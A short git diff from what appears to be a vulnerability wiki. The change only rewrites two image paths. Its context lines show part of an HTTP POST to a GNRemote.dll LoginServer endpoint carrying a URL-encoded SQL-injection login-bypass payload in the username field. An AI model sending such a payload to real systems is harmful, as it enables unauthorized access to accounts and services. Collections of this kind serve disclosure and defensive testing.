@@ -26,4 +26,5 @@ POST /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
 username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
 ```
 
-![img](../../../.vuepress/public/img/1664803838437-475c0c08-3cf2-482d-afbd-2c703ef58475.png)![img](/assets/PeiQi-Wiki/img/1664803846559-8bf28c7c-a65a-4aca-8188-839f57a401d3.png)
+![img](/assets/PeiQi-Wiki/img/1664803838437-475c0c08-3cf2-482d-afbd-2c703ef58475.png)
+![img](/assets/PeiQi-Wiki/img/1664803846559-8bf28c7c-a65a-4aca-8188-839f57a401d3.png)
